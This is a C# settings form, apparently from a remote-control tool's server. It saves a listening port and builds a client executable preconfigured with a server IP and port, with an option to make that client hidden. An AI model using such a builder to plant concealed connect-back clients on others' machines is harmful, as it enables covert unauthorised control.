using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using RemoteControl.Protocals;
using RemoteControl.Protocals.Utilities;

namespace RemoteControl.Server
{
    public partial class FrmSettings : FrmBase
    {
        public FrmSettings()
        {
            InitializeComponent();
            this.EnableCancelButton = true;
        }

        private void FrmSettings_Load(object sender, EventArgs e)
        {
            base.EnableCancelButton = true;
            this.textBox2.Text = Settings.CurrentSettings.ServerPort.ToString();
            this.textBox3.Text = this.textBox2.Text;
        }

        private void buttonSaveServerSetting_Click(object sender, EventArgs e)
        {
            int serverPort;
            if (!int.TryParse(this.textBox3.Text, out serverPort))
                return;
            Settings.CurrentSettings.ServerPort = serverPort;
            MsgBox.ShowInfo("已保存!");
        }

        private void buttonGenClient_Click(object sender, EventArgs e)
        {
            string serverIP = this.textBox1.Text.Trim();
            string serverPort = this.textBox2.Text.Trim();
            int serverPortNum;
            if (!int.TryParse(serverPort, out serverPortNum))
                return;

            SaveFileDialog dialog = new SaveFileDialog();
            dialog.Filter = "可执行程序(*.exe)|*.exe|所有文件(*.*)|*.*";
            dialog.FilterIndex = 1;
            if (dialog.ShowDialog() == System.Windows.Forms.DialogResult.OK)
            {
                ClientParameters para = new ClientParameters();
                para.SetServerIP(serverIP);
                para.ServerPort = serverPortNum;

                byte[] fileBytes = null;
                if (System.IO.File.Exists("RemoteControl.Client.dat"))
                {
                    fileBytes = System.IO.File.ReadAllBytes("RemoteControl.Client.dat");
                }
                else
                {
                    fileBytes = ResUtil.GetResFileData("RemoteControl.Client.dat"); 
                }
                ClientParametersManager.WriteClientStyle(fileBytes,
                    this.checkBoxHideClient.Checked ? ClientParametersManager.ClientStyle.Hidden : ClientParametersManager.ClientStyle.Normal);
                ClientParametersManager.WriteParameters(fileBytes, dialog.FileName, para);
                MsgBox.ShowInfo("客户端生成成功！");
            }
        }

        private void buttonSelectIP_Click(object sender, EventArgs e)
        {
            var ips = Utils.GetIPAddressV4();
            ContextMenuStrip cms = new ContextMenuStrip();
            ips.ForEach(a =>
            {
                cms.Items.Add(a, null, (o, args) =>
                {
                    this.textBox1.Text = a;
                });
            });
            cms.Show(this.buttonSelectIP, new Point(0, buttonSelectIP.Height));
        }
    }
}
